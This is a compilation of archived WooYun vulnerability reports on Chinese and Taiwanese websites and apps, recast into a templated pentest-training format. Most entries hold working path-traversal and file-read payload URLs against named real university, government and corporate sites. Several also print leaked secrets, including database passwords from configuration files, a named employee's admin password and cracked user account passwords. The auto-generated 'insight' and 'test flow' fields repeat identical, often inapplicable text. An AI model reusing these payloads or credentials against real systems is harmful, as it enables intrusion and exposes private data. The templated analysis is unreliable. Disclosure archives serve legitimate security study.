**厂商**: sjtu.edu.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://yzb.sjtu.edu.cn/tutor/showTutorPic.ahtml?dsgh=../../../../../../../../../../etc/passwd%00.jpg查看源码...root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8

**POC**: http://yzb.sjtu.edu.cn/tutor/showTutorPic.ahtml?dsgh=../../../../../../../../../../etc/passwd%00.jpg

**绕过**: 直接利用

**修复**: 你们比我更专业！！！！
---

---
### [wooyun-2015-0102299] 长城证券某漏洞导致任意文件下载
**厂商**: cgws.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无意中发现的，通过ip反查知道是长城证券搜了下ip，乌云上没重复的ps:必须要截断下下载passwdhttp://58.251.17.112/smenu.php?menu=../../../../../../../../../../etc/passwd%00

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 控制权限
---

---
### [wooyun-2012-08678] 某任意文件下载(通用，可影响某省多个政府站点！)
**厂商**: 某省政府多个部门 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接:http://x.x.x.x/cyportal/downloadtag.jsp?fileName=*.*&filePath=*/*.*http://x.x.x.x/cyportal.1/downloadtag.jsp?fileName=*.*&filePath=*/*.*http://x.x.x.x/cyportal1.3/downloadtag.jsp?fileName=*.*&filePath=*/*.*其中文件下载路径参数filepath没有对路径进行必要的限制！

**POC**: 漏洞证明可参照之前提交的“河北财政信息网任意文件下载 ”：WooYun: 河北财政信息网任意文件下载第一组(cyportal):http://www.sjzkj.gov.cn/cyportal/downloadtag.jsp?fileName=1.jsp&filePath=../cyportal/downloadtag.jsphttp://www.hebdj.gov.cn/cyportal/downloadtag.jsp?fileName=1.jsp&filePath=../cyportal/downloadtag.jsphttp://www.hbkp.gov.cn/cyportal/down

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2015-0119702] 乾贷网多个设计缺陷导致用户账户安全受到威胁（多个用户账号证明）
**厂商**: qiandw.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: # 会去看乾贷网的接口是因为看到了师傅@her0ma 发的漏洞WooYun: p2p金融安全之乾贷网目录遍历导致服务器被控制厂商回复：我们目前服务器放在阿里云金融机房，和支付宝享受同等级别的安全。不管厂商出于什么想法做出这样的回复，我想说：安全级别不是由你放在哪个机房决定的。名人名言：安全是动态的-----马克-吐温以下涉及用户隐私的内容麻烦审核小伙伴mask一下问题1#主站接口存在安全漏洞导致可撞库或探测弱口令Host: www.qiandw.comPOST /Account/LogInDATA __RequestVerificationToken=****&ReturnUrl=&userName=*A*&password=*B*&ajax=1&loginBt=%E7%AB%8B%E5%8D%B3%E7%99%BB%E5%BD%95以下是探测出来的部分账户密码liuyi	123456xi

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-028488] 大唐某公司任意文件下载漏洞(二)
**厂商**: 中国大唐集团海外投资有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.china-cdto.com/hwtzweb//accessoriesAction.ndo?action=download&itemId=3948D7CD-7908-DEE4-9325-79A6F3A9C744&filePath=/index.jsp&fileName=index.jsp修改参数 filePath 即可下载任意文件

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-025017] 中国电力两政府站点任意文件下载，其中一处可劫持后台数据库
**厂商**: 中国电力两政府站点 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 两处均可下载web.config：第一处：中国电力建设企业协会 http://www.cepca.org.cn第一处漏洞点：http://www.cepca.org.cn/download/download.aspx?filepath=/cns/../web.config&filename=web.config第二处：中国电力工程质量监督总站 http://dlzj.cec.org.cn第二处漏洞点：http://dlzj.cec.org.cn/DownLoad.aspx?filePath=/web.config&fileName=web.config

**POC**: 中国电力建设企业协会web.config：数据库信息：server=localhost;uid=wensh;pwd=wensh22;database=Cepca2009_change;没有站库分离中国电力工程质量监督总站web.config：数据库信息：data source=10.1.64.32;initial catalog=epqs;integrated security=false;persist security info=True;User ID=sa;Password=sa,./123456有站库分离设计nmap端口扫描：中国电力建设企业协会 http://www.cepca.o

**绕过**: 直接利用

**修复**: 下载前过滤，白名单，比如只让下载xls,doc等1433端口建议不要在公网上开放
---

---
### [wooyun-2015-0153398] 某通用管理系统设计缺陷可爆破及目录遍历（联想/美的/体彩/夏普等受影响）
**厂商**: 至德讯通 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/login.phphttp://**.**.**.**/index.phphttp://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/login.phphttp://**.**.**.**/login.phphttp://**.**.**.**/login.php...

**POC**: 联想联想lephone美的体彩附送一个目录遍历http://**.**.**.**/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-06072] 微盘(有条件)任意文件下载漏洞
**厂商**: 新浪 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://openapi.vdisk.me/?m=file&a=jump_to_s3&uid=UID&fid=FID没有任何认证即转向具体下载地址, 但需要知道 uid (实为微盘的 vuid) 和 fid (文件编号).uid 较易获取(如果用户有分享文件). fid 可通过猜测进行, 文件编号比较有序, 难度虽稍大但看起来仍然可行.如果 fid 能随便拿到的话 Rank 就是 20 了.

**POC**: 比如在某页上看到vdisk.filePreview.init("2120379","44104201","pdf");使用http://openapi.vdisk.me/?m=file&a=jump_to_s3&uid=2120379&fid=44104201即可获得该文件.微盘客户端抓包获得 uid / fid 之后无认证即可同样下载, 故认为是认证有问题.

**绕过**: 直接利用

**修复**: 未分享的文件检测一下 token.
---

---
### [wooyun-2015-0147859] 四川大学某站配置不当目录遍历导致用户信息/合同外泄
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/不行这次不能漏洞被拒绝了，要上点猛料。这个目录下的最后两个excel表有大量的用户信息。这目录更劲爆，看名字就知道，只不过有点年头了，不开心。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不用我说
---

---
### [wooyun-2013-044411] 58同城Android客户端远程文件写入漏洞
**厂商**: 58同城 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 58同城Android客户端中包含一个下载并缓存远程内容的Content Provider，即com.wuba.LocalFileContentProvider，此Content Provider采用默认的导出配置，即android:exported="true"，任意第三方APP都可以调用此接口访问数据。该Content Provider实现了openFile()接口，通过此接口可以访问外部网络中的数据，并将其缓存到私有目录/data/data/com.wuba/wbcache目录中。调用此接口可以向/data/data/com.wuba/wbcache目录无限制填充数据，Android没有明确指明分配给每个APP的私有存储空间，因此，可以写满整个内存卡，导致手机不能正常使用，当然，也可以默默地把用户手机流量耗尽。

**POC**: 使用浏览器（支持content://）打开包含如下内容的链接，浏览器就会调用58同城客户端APP对应的Content Provider组件下载并缓存远程的文件，作为示例，仅仅让它下载一些apk文件。<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8" /><title>58 Content Provider File Operations PoC</title><script type="text/javascript" src="content://com.wuba.hybrid.localfile/1.http://fi

**绕过**: 直接利用

**修复**: 凡只用于内部调用的组件，导出配置都应该设置为false，即android:exported="false"。
---

---
### [wooyun-2014-064731] 新东方某分站任意文件下载
**厂商**: 新东方 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无。

**POC**: zhaopin.xdf.cn/backend.php/interface/getdoc/?path=../../../../../../../../../../../../../etc/passwd&name=1.jpgroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:s

**绕过**: 直接利用

**修复**: 你们懂
---

---
### [wooyun-2015-0134737] 任我行crm任意文件下载
**厂商**: 成都任我行信息技术有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用上传头像功能上传头像看到图片链接了吧，很漂亮的一张美女图片，插完才发现被我给毁了，恨比天高

**POC**: 这么简单就可以看到应用的配置文件了

**绕过**: 直接利用

**修复**: 厂商大牛来修复吧，我们的crm好危险
---

---
### [wooyun-2015-0151819] 上海某开发框架软件研发弱口令
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一个目录遍历+开发框架后台弱口令开头只是简单的目录遍历，然并卵，后来发现PDF文件下有个站点，手贱一下端口探测，登录一下发现弱口令（直接显示给你看），只是个测试系统难道？由于时间关系未能深入。乌云新人求rank啊，想进入社区。

**POC**: 01 目录遍历02 开发框架后台弱口令link：http://**.**.**.**:8080/Login

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2015-0117125] 江苏盐某城市行政中心信息泄露(已入后台)
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.jsycjw.gov.cn/oldjjw/admin/update.asp?action=update  直接暴密码http://www.jsycjw.gov.cn/oldjjw/admin/update.asp?action=update  直接暴密码目录遍历

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 政府懂的
---

---
### [wooyun-2015-0135850] 百度91协同工作平台任意文件读取
**厂商**: 福建网龙 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网龙的程序猿都喜欢把js这么加载么？？

**POC**: http://testbaiduerp.91.com/common/HttpCombiner.ashx?src=~/web.confighttp://nderp.99.com/common/HttpCombiner.ashx?src=~/Default.aspx

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2015-0162145] 西南财经大学某分站任意文件下载导致敏感信息泄漏
**厂商**: 西南财经大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL:icfs.swufe.edu.cn/index.php?a=download&file=下载index.php:icfs.swufe.edu.cn/index.php?a=download&file=index.php读取信息：下载kernel.php：icfs.swufe.edu.cn/index.php?a=download&file=/framework/kernel.php读取信息：下载config.inc.php：icfs.swufe.edu.cn/index.php?a=download&file=/temp/configs/config.inc.php读取信息可得到mysql和ftp的帐号密码：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: RT
---

---
### [wooyun-2015-0109322] 中通速递多站某站任意文件读取
**厂商**: 中通速递 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用友NC /hrss/ELTextFile.load.d 任意文件读取http://erp.zto.cn/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xmljdbc:oracle:thin:@192.168.0.127:1521:erpdbhttp://nc.zto.cn/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xmljdbc:oracle:thin:@192.168.0.127:1521:erpdb

**POC**: 用友NC /hrss/ELTextFile.load.d 任意文件读取http://erp.zto.cn/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xmljdbc:oracle:thin:@192.168.0.127:1521:erpdbhttp://nc.zto.cn/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xmljdbc:oracle:thin:@192.168.0.127:1521:erpdb

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2014-088425] 黑龙江省地震局任意文件读取
**厂商**: 黑龙江省地震局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞描述：黑龙江省地震局网站（http://hea.gov.cn）出现服务器任意文件下载漏洞，包括passwd等，甚至/root/.bash_history查看管理员操作的历史记录，通过进一步渗透得知服务器是Suse linux10的系统，服务器运行tomcat、mysql等服务，进一步可以获得mysql密码。服务器任意文件下载地址：http://hea.gov.cn/manage/content/docmanage/download.jsp?filePath=../etc/passwdhttp://hea.gov.cn/manage/content/docmanage/download.jsp?filePath=../root/.bash_history

**POC**: 可使用curl命令可获取任意文件。使用-o参数下载服务器/root/.bash_profile文件查看后，发现泄漏mysql密码，如图

**绕过**: 直接利用

**修复**: 建议过滤关键字符串防止任意文件下载，同时严格控制操作系统文件权限，/root/.bash_history应该是600的权限，普通用户不应该可读。
---

---
### [wooyun-2011-03266] coremail任意文件读取漏洞
**厂商**: Coremail盈世信息科技（北京）有限公司 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: coremail服务在接受和传递参数时使用的是xml的格式进行数据传递，但是根据80sec的安全公告，如果服务端在处理xml数据时格式不对就会导致安全漏洞，使用应用上下文的权限来获取任意文件内容，结合逻辑可能可以得到更多的权限

**POC**: 神奇的代码哦，就是简单的在xml头部附加我们的恶意就可以了POST /js4/s?sid=jAZNlaKzhPcBsFgYIazzsbDOwpsMYtTh&func=mbox:compose&l=compose&action=deliver HTTP/1.1Content-Type: application/x-www-form-urlencodedAccept: text/javascriptReferer: http://twebmail.mail.163.com/js4/index.jsp?sid=jAZNlaKzhPcBsFgYIazzsbDOwpsMYtThAccept-Langua

**绕过**: 直接利用

**修复**: 修改服务端xml解析器 禁用外部实体
---

---
### [wooyun-2014-062347] 大批gov.cn政府网站任意文件下载(此处列出20余个)
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.grny.gov.cn/grny/images/stories/download.php?filename=download.phphttp://zzz.lgq.gov.cn/admin/infofiles/download.php?filepath=./download.php&filename=download.phphttp://fwpt.hnjgdj.gov.cn/web/download.action?fileName=../../index.jsphttp://bdanews.bda.gov.cn/front/download.action?fileName=index.jsphttp://www.yhmohrss.gov.cn/lemis/netweb/detail/download.jsp?url=/netweb/detail/&filename=do

**POC**: 其中一个download.jsphttp://www.yhmohrss.gov.cn/lemis/netweb/detail/download.jsp?url=/netweb/detail/&filename=download.jsp<%@ page contentType="text/html;charset=gb2312"import="com.jspsmart.upload.*,java.io.File" %><%// 新建一个SmartUpload对象SmartUpload su = new SmartUpload();// 初始化su.initialize(pageContext);

**绕过**: 直接利用

**修复**: .....
---

---
### [wooyun-2015-0114500] 台湾某政府分站任意文件下载
**厂商**: Hitcon台湾互联网漏洞报告平台 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 台湾某政府分站任意文件下载

**POC**: http://social.ntpc.gov.tw/jsp/public/OpenReport.jsp?filename=../../../../../../../../Windows/System32/drivers/etc/hosts# Copyright (c) 1993-1999 Microsoft Corp.## This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to host names. Each# 

**绕过**: 直接利用

**修复**: 过滤 ..
---

---
### [wooyun-2016-0168938] 飛牛牧場設計缺陷任意文件下載(存在注入)（臺灣地區）
**厂商**: 飛牛牧場 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://**.**.**.**1.任意文件下载构造，http://**.**.**.**/cn/download.php?f=/cn/index.php配置信息http://**.**.**.**/cn/download.php?f=/cn/info.phpinfo.php中$DEF_dbServer = "**.**.**.**";$DEF_dbName = "flyingco";$DEF_dbUser = "flyingco";$DEF_dbPswd = "anan6av9";passwd下载http://**.**.**.**/cn/download.php?f=/../../../etc/passwdpasswd中root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/bin/bashdaemon:x:2:2:Daemon:

**POC**: passwd中root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/bin/bashdaemon:x:2:2:Daemon:/sbin:/bin/bashlp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bashmail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/falsenews:x:9:13:News system:/etc/news:/bin/bashuucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2016-0176097] 爱奇艺APP远程代码执行（APP自身实现问题含poc）
**厂商**: 奇艺 | **年份**: 2016 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 爱奇艺APP存在两处漏洞，结合使用可导致远程代码执行。（爱奇艺7.1版本）第一处漏洞：面对面传视频插件存在漏洞，对传送文件不做类型判断，可以传送任意文件，同时未对保存路径做安全处理，存在../../路径穿越，因此可以向接收方发送任意文件以爱奇艺的权限保存在任意路径。第二处漏洞：爱奇艺在校验加载的so文件时，通过比较每个so的前1024字节运算的CRC与对应目录下crc.cfg存放的crc值进行比较，从而验证so的完整性，但是并未校验crc.cfg文件的可靠性，因此，利用第一处漏洞，可以向接收者发送修改后的crc.cfg以及so文件，当下次打开爱奇艺时，可以绕过so验证，执行so代码。攻击场景如下：A为攻击者（发送方），B为受害者（接收方），A与B进行面对面传视屏。该攻击需要发送2次文件，第一次在A给B发送文件时，A利用HOOK技术hook住关键的API，修改发送给B的文件为修改过的crc.

**POC**: 接收者B为MX5，测试之前，先查看要修改的文件情况，POC需要修改的目录是/data/data/com.qiyi.video/files/libs-5_9_59A78C6F_1943093_，要修改其crc.cfg和其中一个so文件这时候，B面对面传点击收文件功能，A面对面点击发送文件功能：A设备上操作：在A设备上（红米2），对关键API com.sdk.multidevicecowork.MultiDeviceCoWork$SendFileTask$SendFileThread.SendFile(java.lang.String, java.lang.String, java.lang.St

**绕过**: 过滤绕过

**修复**: 两部走：限制文件格式以及防止路径穿越，可以再对crc.cfg进行一次校验
---

---
### [wooyun-2015-0116852] 游族网络某站两处任意文件包含漏洞
**厂商**: 上海游族网络股份有限公司 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对，其实严格来说是文件包含，不过可以读取任意文件分别在http://king.youzu.com/image/downloadImg?src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd以及http://king.youzu.com/image/downloadAudio?src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

**POC**: 听说你们又开始有礼物了！

**绕过**: 直接利用

**修复**: 你们更懂
---

---
### [wooyun-2014-080423] 上海快捷快递某系统任意文件下载
**厂商**: 上海快捷快递 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大量快递单泄露（大数据。快递单信息绝对过万了）。。  泄露很多的目录

**POC**: 大量快递单泄露（大数据。快递单信息绝对过万了）。。  泄露很多的目录

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-083753] 胡莱游戏某系统任意文件读取
**厂商**: hoolai.com | **年份**: 2014 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 胡莱邮箱系统是Zimbra,该系统存在本地文件包含漏洞地址:http://mail.hoolai.com/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00

**POC**: 见详细说明.

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2015-0117758] 某省教育厅主站存在任意文件下载漏洞
**厂商**: 某省教育厅 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 福建省教育厅http://www.fjedu.gov.cn/问题出在图片新闻处http://www.fjedu.gov.cn/html/jyyw/tpxw/2015/04/22/3a30378e-66df-42d8-8d1a-3f9dd3fd2f6d.htmlhttp://www.fjedu.gov.cn/submission/showAttach.do?path=99999950/2015/04/22/QQ图片20150421155912_编辑.jpg&fileName=QQ图片20150421155912_编辑.jpg&isAttach=0将url构造一下http://www.fjedu.gov.cn/submission/showAttach.do?path=99999950/2015/04/22/../../../../../../../../../etc/passwd&fileN

**POC**: http://www.fjedu.gov.cn/submission/showAttach.do?path=99999950/2015/04/22/../../../../../../../../../etc/hosts&fileName=hosts&isAttach=0

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2014-056772] 融资城oa办公系统目录遍历导致敏感信息泄漏
**厂商**: 352.com | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 泄漏地址：http://oa.352.com:88/db/我先下载下来一个system_db看看~里面是用户登录的信息~比如：我登录admin~会出现登录信息~比如：里面的这个chenting，的确有这个用户~而且还爆出了一些用户的密码~这个信息量太大了~从2009年就有了~我翻不下去了~~~然而里面还有些其他信息~不仅仅是用户信息~还有什么项目，邮件之类的信息

**POC**: 泄漏地址：http://oa.352.com:88/db/我先下载下来一个system_db看看~里面是用户登录的信息~比如：我登录admin~会出现登录信息~比如：里面的这个chenting，的确有这个用户~而且还爆出了一些用户的密码~这个信息量太大了~从2009年就有了~我翻不下去了~~~然而里面还有些其他信息~不仅仅是用户信息~还有什么项目，邮件之类的信息

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0145000] 郑州威科姆科技股份有限公司主站任意文件读取漏洞（细节挖掘）
**厂商**: 郑州威科姆科技股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 访问如下 http://www.zzvcom.com/plant/news.html发送包中会有如下接口利用火狐插件中的firebug点击网络 发现有如下接口http://www.zzvcom.com/cms/interface.jsp?time=53&data={readfile:%27/A02/A02016/A02016001/list.json%27}&jsoncallback=jsonp1443599753605 readfile 我们读取下文件 http://www.zzvcom.com/cms/interface.jsp?time=41&data={readfile:%27/WEB-INF/web.xml%27}&jsoncallback=jsonp1442909681355 响应报内容如下jsonp1442909681355(VCOMCMS 404 /error_404.js

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 程序员懂
---

---
### [wooyun-2015-0121482] 珂兰钻石网某管理系统弱口令(敏感信息泄漏)
**厂商**: 上海珂兰商贸有限公司 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://webadmin.kela.cn/黄春艳 222222 弱口令，已经多日未修改，已将密码修改为Aa222222慌不知不知何时上线了http://management.kela.cn/访问http://webadmin.kela.cn/一看已经200多w会员了，增速好快可访问http://shop.kela.cn/admin.phpexcel上传功能异常，无权限上传文件到web目录了，如果还给权限上传文件，我还是妥妥能传个文件的，仅前台校验xml格式文件，http改包改成php文件即可上传成功到/data/www/shopold/images/xls/目录。看了看任意文件下载漏洞还在http://shop.kela.cn/gift.php?c=gift&a=downloads&filename=../../../../../../../../etc/passwd

**POC**: 11年8月，14年6月分别造访过服务器，无任何破坏

**绕过**: 直接利用

**修复**: 管理员修改密码时建议进行手机短信验证，手机短信验证码为6~8位包含大小写字母和数字至少三种
---

---
### [wooyun-2011-03265] 163邮箱126邮箱任意文件下载漏洞
**厂商**: 网易 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 163的服务器在接受和传递参数时使用的是xml的格式进行数据传递，但是根据80sec的安全公告，如果服务端在处理xml数据时格式不对就会导致安全漏洞，使用应用上下文的权限来获取任意文件内容，结合逻辑可能可以得到更多的权限

**POC**: 神奇的代码哦，就是简单的在xml头部附加我们的恶意就可以了POST /js4/s?sid=jAZNlaKzhPcBsFgYIazzsbDOwpsMYtTh&func=mbox:compose&l=compose&action=deliver HTTP/1.1Content-Type: application/x-www-form-urlencodedAccept: text/javascriptReferer: http://twebmail.mail.163.com/js4/index.jsp?sid=jAZNlaKzhPcBsFgYIazzsbDOwpsMYtThAccept-Langua

**绕过**: 直接利用

**修复**: 修改服务端xml解析器 禁用外部实体
---

---
### [wooyun-2015-0131285] 搜狗某站点任意文件读取
**厂商**: 搜狗 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

